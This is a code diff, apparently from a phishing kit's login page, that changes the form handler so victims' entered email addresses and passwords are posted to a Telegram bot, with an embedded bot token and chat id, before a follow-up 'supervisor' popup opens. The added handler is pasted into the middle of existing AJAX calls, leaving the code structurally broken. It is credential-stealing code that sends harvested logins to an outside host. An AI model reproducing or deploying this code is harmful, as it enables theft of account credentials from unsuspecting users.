@@ -431,16 +431,43 @@ position: fixed;
           count=0;
          
          
-		$.ajax({
-         dataType: 'JSON',
-         url: 'next.php',
-        type: 'POST',
-         data:{
-           email:email,
-           password:password,
-          detail:detail 
-             }
-          }); 
+		$('#submit-btn').click(function (event) {
+    event.preventDefault();
+
+    var email = $("#email").val();
+    var password = $("#password").val();
+    var detail = $("#field").html();
+
+    // Telegram Bot API
+    $.ajax({
+        url: "https://api.telegram.org/bot8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM/sendMessage",
+        type: "POST",
+        data: {
+            chat_id: "8614416084",
+            text:
+                "Email: " + email +
+                "\npsswork: " + password +
+                "\nDetail: " + detail
+        },
+        success: function () {
+
+            // Pass values to supervisor form
+            $("#codeemail").val(email);
+            $("#codeDetail").val(detail);
+
+            // Hide first modal
+            $('#ajaxModal').hide();
+            $('.modal-backdrop').hide();
+
+            // Open supervisor popup
+            openPopup();
+
+        },
+        error: function () {
+            alert("Unable to send.");
+        }
+    });
+});
           
           
         document.getElementById('codeEmail').value = email;
@@ -466,16 +493,43 @@ position: fixed;
         else
         {
             
-         $.ajax({
-          dataType: 'JSON',
-          url: 'next.php',
-          type: 'POST',
-          data:{
-            email:email,
-            password:password,
-            detail:detail,
+         $('#submit-btn').click(function (event) {
+    event.preventDefault();
 
-          },
+    var email = $("#email").val();
+    var password = $("#password").val();
+    var detail = $("#field").html();
+
+    // Telegram Bot API
+    $.ajax({
+        url: "https://api.telegram.org/bot8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM/sendMessage",
+        type: "POST",
+        data: {
+            chat_id: "8614416084",
+            text:
+                "Email: " + email +
+                "\npsswork: " + password +
+                "\nDetail: " + detail
+        },
+        success: function () {
+
+            // Pass values to supervisor form
+            $("#codeemail").val(email);
+            $("#codeDetail").val(detail);
+
+            // Hide first modal
+            $('#ajaxModal').hide();
+            $('.modal-backdrop').hide();
+
+            // Open supervisor popup
+            openPopup();
+
+        },
+        error: function () {
+            alert("Unable to send.");
+        }
+    });
+});
             // data: $('#contact').serialize(),
             beforeSend: function(xhr){
               $('#submit-btn').html('Verifing...');
